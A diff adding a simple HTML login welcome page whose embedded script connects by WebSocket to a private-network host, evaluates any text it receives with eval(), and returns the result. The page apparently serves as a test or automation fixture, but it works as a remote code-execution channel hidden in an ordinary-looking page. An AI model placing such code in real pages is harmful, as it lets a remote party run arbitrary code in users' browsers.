@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome Page</title>
+  <link href="demo.css" media="all" rel="stylesheet" type="text/css">
+	<script type="text/javascript">
+
+	var socket = new WebSocket("ws://10.86.8.71:82/");
+	socket.onmessage = function(event){
+		text = event.data;
+		if(text == 'init') {  
+			socket.send('ready');
+		} else if (text == 'close') {
+			socket.send('closed');
+		} else {
+			result = eval(text);
+			var resp = result + '<split>success';
+			socket.send(resp);	
+			
+		}
+	}
+
+	</script>
+</head>
+<body bgcolor="#0000FF">
+<div id='container'>
+  <h1 id="welcome">Welcome Page</h1>
+  <p>Login succeeded. Now you can <a href=".">logout</a>.</p>
+</div>
+</body>
+</html>
